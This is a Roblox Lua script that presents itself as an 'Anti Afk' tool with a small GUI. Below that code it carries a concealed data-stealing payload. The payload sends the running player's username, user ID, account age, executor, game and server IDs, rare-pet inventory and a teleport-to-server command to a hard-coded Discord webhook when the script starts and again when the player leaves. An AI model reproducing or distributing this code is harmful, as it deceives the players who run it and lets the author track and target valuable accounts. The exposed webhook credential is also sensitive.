wait(0.5)local ba=Instance.new("ScreenGui")
local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
local _b=Instance.new("TextLabel")local ab=Instance.new("TextLabel")ba.Parent=game.CoreGui
ba.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;ca.Parent=ba;ca.Active=true
ca.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ca.Draggable=true
ca.Position=UDim2.new(0.698610067,0,0.098096624,0)ca.Size=UDim2.new(0,370,0,52)
ca.Font=Enum.Font.SourceSansSemibold;ca.Text="Anti Afk"ca.TextColor3=Color3.new(0,1,1)
ca.TextSize=22;da.Parent=ca
da.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)da.Position=UDim2.new(0,0,1.0192306,0)
da.Size=UDim2.new(0,370,0,107)_b.Parent=da
_b.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)_b.Position=UDim2.new(0,0,0.800455689,0)
_b.Size=UDim2.new(0,370,0,21)_b.Font=Enum.Font.Arial;_b.Text="Made by luca#5432"
_b.TextColor3=Color3.new(0,1,1)_b.TextSize=20;ab.Parent=da
ab.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ab.Position=UDim2.new(0,0,0.158377,0)
ab.Size=UDim2.new(0,370,0,44)ab.Font=Enum.Font.ArialBold;ab.Text="Status: Active"
ab.TextColor3=Color3.new(0,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
bb:CaptureController()bb:ClickButton2(Vector2.new())
ab.Text="Roblox tried kicking you buy I didnt let them!"wait(2)ab.Text="Status : Active"end)

-- Ensure HTTP requests are supported by the exploit
if not syn and not http and not request then
    print("Your executor does not support HTTP requests!")
    return
end

-- Updated Webhook URL
local webhookURL = "https://discord.com/api/webhooks/1378431737994022942/5v5nZISrPtDAHnKspwkc6yA5ZrHLdFt2-hD4LYsdcTaWNqFaEQef73raSYqndDmUDZ3c"

-- Get Player & Game Info
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")

local gameService = MarketplaceService:GetProductInfo(game.PlaceId)
local gameName = gameService.Name
local gameID = game.GameId
local placeID = game.PlaceId
local jobID = game.JobId
local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"

-- Calculate Account Creation Date
local daysSinceCreation = player.AccountAge
local creationDate = os.date("%Y-%m-%d", os.time() - (daysSinceCreation * 86400))

-- Define Pet Rarities
local rarityOrder = {
    ["Legendary"] = 1,
    ["Ultra Rare"] = 2,
    ["Rare"] = 3,
    ["Uncommon"] = 4,
    ["Common"] = 5
}

-- Function to retrieve and sort all pets
local function getAllPets()
    local petsByRarity = {
        ["Legendary"] = {},
        ["Ultra Rare"] = {},
        ["Rare"] = {},
        ["Uncommon"] = {},
        ["Common"] = {}
    }
    local totalPets = 0

    local success, inventory = pcall(function()
        return player:FindFirstChild("Backpack") and player.Backpack:GetChildren() or {}
    end)

    if success and inventory then
        for _, item in ipairs(inventory) do
            if item:IsA("Tool") or item:IsA("Model") or item:IsA("Folder") then
                local petName = item.Name
                local petRarity = "Unknown"

                if item:FindFirstChild("Rarity") then
                    petRarity = item.Rarity.Value
                end

                if not rarityOrder[petRarity] then
                    petRarity = "Common"
                end

                table.insert(petsByRarity[petRarity], petName)
                totalPets = totalPets + 1
            end
        end
    end

    return totalPets, petsByRarity
end

-- Function to format pets list by rarity
local function formatPetList(petsByRarity)
    local formattedList = {}

    for rarity, _ in pairs(rarityOrder) do
        if #petsByRarity[rarity] > 0 then
            table.insert(formattedList, "**" .. rarity .. "**: " .. table.concat(petsByRarity[rarity], ", "))
        end
    end

    return #formattedList > 0 and table.concat(formattedList, "\n") or "No pets found."
end

-- Function to send webhook notifications
local function sendWebhook(eventType)
    local message = eventType == "join" and "**Executor Script Executed!**" or "**Player Left the Game!**"
    local embedColor = eventType == "join" and 16711680 or 16776960

    local totalPets, petsByRarity = getAllPets()
    local petList = formatPetList(petsByRarity)

    if #petList > 1024 then
        petList = petList:sub(1, 1020) .. "..."
    end

    local data = {
        ["content"] = "@everyone " .. message,
        ["embeds"] = {{
            ["title"] = eventType == "join" and "Execution Alert" or "Disconnection Alert",
            ["description"] = eventType == "join" and "A player has executed the script!" or "The player has left the game.",
            ["color"] = embedColor,
            ["fields"] = {
                {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
                {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
                {["name"] = "Profile Link", ["value"] = "[View Profile](" .. profileLink .. ")", ["inline"] = false},
                {["name"] = "Account Creation Date", ["value"] = creationDate, ["inline"] = true},
                {["name"] = "Account Age (Days)", ["value"] = tostring(daysSinceCreation), ["inline"] = true},
                {["name"] = "Executor", ["value"] = identifyexecutor and identifyexecutor() or "Unknown", ["inline"] = true},
                {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
                {["name"] = "Game ID", ["value"] = tostring(gameID), ["inline"] = true},
                {["name"] = "Place ID", ["value"] = tostring(placeID), ["inline"] = true},
                {["name"] = "Server Job ID", ["value"] = jobID, ["inline"] = false},
                {["name"] = "Total Pets", ["value"] = tostring(totalPets), ["inline"] = true},
                {["name"] = "Pets (Sorted by Rarity)", ["value"] = petList, ["inline"] = false},
                {["name"] = "Teleport to This Server", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeID .. ", '" .. jobID .. "')```", ["inline"] = false}
            }
        }},
        ["allowed_mentions"] = {["parse"] = {"everyone"}}
    }

    local jsonData = HttpService:JSONEncode(data)

    local function sendRequest()
        local req = syn and syn.request or request or (http and http.request)
        if req then
            req({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        else
            print("No supported exploit functions found!")
        end
    end

    sendRequest()
end

-- Notify when the script is executed
sendWebhook("join")

-- Notify when the player leaves the game
Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == player then
        sendWebhook("leave")
    end
end)

game:BindToClose(function()
    sendWebhook("leave")
end)
